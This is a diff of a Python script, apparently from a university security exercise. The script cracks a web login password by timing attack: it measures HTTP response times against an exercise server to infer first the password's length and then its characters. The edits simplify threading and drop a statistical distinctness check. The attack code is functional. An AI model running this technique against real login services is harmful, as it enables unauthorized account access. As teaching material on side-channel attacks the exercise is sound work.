@@ -1,6 +1,5 @@
 import os
 import string
-import scipy.stats as st
 import logging as log
 from time import time
 import time as timer
@@ -9,7 +8,6 @@ from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 import requests
 
-REQUESTS_SESSION = requests.Session()
 
 # - - - - - - - - - -  LOG SECTION  - - - - - - - - - -
 
@@ -141,7 +139,7 @@ def run_url(url: str, logger=None) -> float:
     """
     try:
         start = time()
-        requests.get(url[9:len(url) - 1])
+        requests.get(url)
         time_pass = time() - start
 
     except Exception as e:
@@ -155,14 +153,14 @@ def run_url(url: str, logger=None) -> float:
 
 def check_password_size_thread(url_result_command: str, iterations: int, thread_number: int, logger) -> float:
     """
-    This function request the given URL iteration times and sum the requests time and return it.
+     This function request the given URL iteration time.
 
     :param url_result_command: String. Given URL to send the request.
     :param iterations: Int. Number of iteration to request the given URL.
     :param thread_number: Int. Thread ID
     :param logger: logger. if not None the function write it action to the given logger.
 
-    :return: Float. Sum all the requests time.
+    :return: Float. the requests time.
     """
 
     res_time = run_url(url_result_command)
@@ -177,32 +175,8 @@ def warmup() -> None:
 
     :return: None.
     """
-    url_time_command = f'curl -s "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"'
+    url_time_command = f'http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1'
     run_url(url_time_command)
-
-
-def check_if_distinct(results: list, alpha=Configurations.default_alpha) -> bool:
-    """
-    This function will check if the given list is distinct according to the normal distribution.
-
-    :param results: List. list with values to verify if distinct according to normal distribution.
-
-    :return: Boolean. True if distinct, false otherwise.
-    """
-    dist_name = "norm"
-    params = {}
-
-    dist = getattr(st, dist_name)
-    param = dist.fit(results)
-
-    params[dist_name] = param
-    # Applying the Kolmogorov-Smirnov test
-    _, p = st.kstest(results, dist_name, args=param)
-
-    if p > alpha:
-        return True
-    else:
-        return False
 
 
 def _get_url_params(start_url: str, end_url: str, password_length: int, password="", ch=None) -> tuple:
@@ -229,14 +203,10 @@ def _get_url_params(start_url: str, end_url: str, password_length: int, password
 
     url = f'{start_url}{password}{end_url}'
 
-    url_result_command = f'curl -s "{url}"'
     url_time_command = f'curl -s "{url}"'
-    # url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
-    #     time_total='time_total', start_url=start_url, password=Configurations.default_character * password_length,
-    #     end_url=end_url)
 
 
-    return url_time_command, url_result_command, url, password
+    return url_time_command, url, url, password
 
 
 def _check_password_size(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size, logger=None) -> dict:
@@ -288,25 +258,6 @@ def _check_password_size(start_url: str = "", end_url: str = "", max_password_si
     return results
 
 
-def _get_chosen_char(results: dict) -> tuple:
-    """
-    This function chose the best char by the result and return tuple contain:
-                                                                    List. Given dict's values as a list without the chosen object.
-                                                                    Object. the chosen item.
-
-    :param results: List. list with
-
-    :return: Tuple:
-                List. contain the given list without the chosen item.
-                Object. chosen item that has been chosen.
-    """
-    max_value_index = max(results, key=results.get)
-    result_list = list(results.values())
-    result_list.remove(results[max_value_index])
-
-    return result_list, max_value_index
-
-
 def check_password_size(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size, logger=None) -> int:
     """
     The function uses timing attack (by time gap) the size of the password.
@@ -320,9 +271,6 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
     """
     warmup()
 
-    distinct = False
-    attempts = 0
-
     # list of lists. represent in each cell a list of all the attempts for a given password length
     all_results_attempts_list = [[] for _ in range(Configurations.default_password_size + 1)]
 
@@ -330,15 +278,8 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
         Configurations.current_attempt += 1
         results_dict = _check_password_size(start_url, end_url, max_password_size, logger)
 
-        for i in range(Configurations.default_password_size):
-            all_results_attempts_list[i].append(results_dict[i])
-
-        # yarden added to check level dictionary
-        chosen_result_all_password_size = {}
-        for i in range(Configurations.default_password_size):
-            chosen_result_all_password_size[i] = min(all_results_attempts_list[i])
-
-        chosen_password_size = max(chosen_result_all_password_size, key=chosen_result_all_password_size.get)
+        for j in range(Configurations.default_password_size):
+            all_results_attempts_list[j].append(results_dict[j])
 
     chosen_result_all_password_size = {}
     for i in range(Configurations.default_password_size):
@@ -351,7 +292,7 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
 
 def crack_password_thread(url_time_command, url_result_command, ch, current_password, iterations: int=1, logger=None) -> float:
     """
-    This function request the given URL iteration times and sum the requests time and return it.
+This function request the given URL return the time it took the request.
 
     :param url_time_command: String. a full URL
     :param url_result_command:
@@ -359,7 +300,7 @@ def crack_password_thread(url_time_command, url_result_command, ch, current_pass
     :param iterations:
     :param logger: logger. if not None the function write it action to the given logger.
 
-    :return: Float. sum of all time it took for do the URL request for all requests.
+    :return: Float. the request time.
     """
     total_iterations_time = 0
 
@@ -380,7 +321,6 @@ def crack_password_thread(url_time_command, url_result_command, ch, current_pass
 
         total_iterations_time += res_time
 
-        # if i + 1 == iterations:
         write_log(logger, f"[crack password thread][{ch}][iteration {Configurations.current_attempt}] result time: {total_iterations_time}  -  {url_result_command}")
 
     return total_iterations_time
@@ -413,8 +353,7 @@ def _check_last_char(start_url: str, end_url: str, password: str, password_size:
                 )
             )
 
-    if Configurations.use_thread_pool:
-        thread_pool.shutdown(wait=True)
+    thread_pool.shutdown(wait=True)
 
     return
 
@@ -556,6 +495,7 @@ def timing_attack(start_url: str = "", end_url: str = "", max_password_size: int
         logger = ""
 
     size = check_password_size(start_url=start_url, end_url=end_url, max_password_size=max_password_size, logger=logger)
+    # size = 16
 
     if size is None:
         return ""
